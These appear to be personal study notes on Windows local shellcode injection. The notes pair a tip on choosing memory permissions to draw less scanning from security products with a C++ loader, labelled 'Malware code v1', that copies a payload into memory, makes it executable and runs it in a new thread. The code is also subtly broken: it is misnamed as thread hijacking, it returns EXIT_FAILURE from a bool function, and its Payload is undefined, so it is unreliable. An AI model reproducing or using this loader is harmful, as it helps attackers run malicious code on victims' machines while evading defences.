### Local shellcode injection

- Prev knowledge: Thread context, Creating and running threads

| A new thread within the process executes our shellcode.

❗Understanding thread and process context w.r.t. OS+arch+exn_env+etc. is imp❗

M/M permissions set to `PAGE_READWRITE` and not `PAGE_EXECUTE_READWRITE`? Latter is scanned more by sec-sol.

Malware code v1:

```cpp
// RunViaClassicThreadHijacking.cpp
#include <windows.h>
#include <iostream>
#include <cstring> // std::memcpy

// Note: this function assumes a x64 CONTEXT structure where Rip is present.
// Keep calling conventions / privileges / thread suspension logic the same as in the original code.

bool LocalShellcodeInjection(PBYTE pPayload, SIZE_T sPayloadSize) {
    PVOID   pAddress        = nullptr;
    DWORD   dwOldProtection = 0;
    HANDLE hThread = nullptr;

    // Allocate memory for the payload
    pAddress = VirtualAlloc(nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == nullptr) {
        std::cerr << "[!] VirtualAlloc Failed With Error : " << GetLastError() << '\n';
        return false;
    }

    // Copy the payload to the allocated memory
    std::memcpy(pAddress, pPayload, sPayloadSize);

    // Change the memory protection to executable
    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        std::cerr << "[!] VirtualProtect Failed With Error : " << GetLastError() << '\n';
        // Optionally free the allocated memory on failure:
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return false;
    }

    // Create thread in suspended state
    hThread = CreateThread(
        nullptr,
        0,
        pAddress, // lpStartAddress - shellcode addr placed here
        nullptr,
        CREATE_SUSPENDED,
        nullptr
    );

    if (hThread == nullptr) {
        std::cerr << "[!] CreateThread Failed With Error : " << GetLastError() << '\n';
        return EXIT_FAILURE;
    }
	
	
    // Resume the suspended thread so it executes our payload
    if (ResumeThread(hThread) == (DWORD)-1) {
        std::cerr << "[!] ResumeThread Failed With Error : " << GetLastError() << '\n';
        CloseHandle(hThread);
        return EXIT_FAILURE;
    }

	WaitForSingleObject(hThread, 5000);
	CloseHandle(hThread);
    return true;
}

int main() {

    // Hijack the sacrificial thread
    if (!LocalShellcodeInjection(Payload, sizeof(Payload))) {
        std::cerr << "[!] Thread shellcode injection failed\n";
        return EXIT_FAILURE;
    }

    std::cout << "[#] Press <Enter> To Quit ... ";
    std::cin.get();

    return EXIT_SUCCESS;
}
```